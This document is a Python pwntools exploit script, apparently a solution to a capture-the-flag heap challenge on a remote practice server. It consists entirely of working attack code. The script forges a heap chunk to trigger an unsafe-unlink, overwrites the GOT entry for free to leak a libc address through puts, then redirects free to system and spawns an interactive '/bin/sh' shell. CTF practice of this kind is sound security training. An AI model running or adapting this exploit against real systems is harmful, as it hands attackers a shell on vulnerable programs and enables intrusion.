from pwn import *
#context.log_level="debug"

sh=remote("node5.buuoj.cn",26192)
elf=ELF("./timu")
libc=ELF("./libc-2.23.so")

def alloc(size):
	sh.sendline(b"1")
	sh.sendline(str(size))
	sh.recvuntil(b"OK\n")

def fill(idx,content):
	sh.sendline(b"2")
	sh.sendline(str(idx))
	sh.sendline(str(len(content)))
	sh.sendline(content)
	sh.recvuntil(b"OK\n")

def free(idx):
	sh.sendline(b"3")
	sh.sendline(str(idx))

free_got=elf.got["free"]
puts_plt=elf.plt["puts"]
puts_got=elf.got["puts"]
target=0x0000000000602140+0x10
fd=target-0x18
bk=target-0x10

alloc(0x30) #1
alloc(0x30) #2
alloc(0x80) #3
alloc(0x30) #4

payload=p64(0)+p64(0x30)+p64(fd)+p64(bk)+0x10*b'a'+p64(0x30)+p64(0x90)
fill(2,payload)

free(3)
payload=0x10*b'a'+p64(free_got)+p64(puts_got)
fill(2,payload)

payload=p64(puts_plt)
fill(1,payload)
free(2)

puts_addr=u64(sh.recvuntil(b'\x7f')[-6:]+b'\x00\x00')
libc_base=puts_addr-libc.sym["puts"]
print("libc_base=",hex(libc_base))
system_addr=libc_base+libc.sym["system"]
#binsh=libc_base+next(libc.search(b"/bin/sh"))

payload=p64(system_addr)
fill(1,payload)
fill(4,b"/bin/sh\x00")
free(4)
sh.interactive()
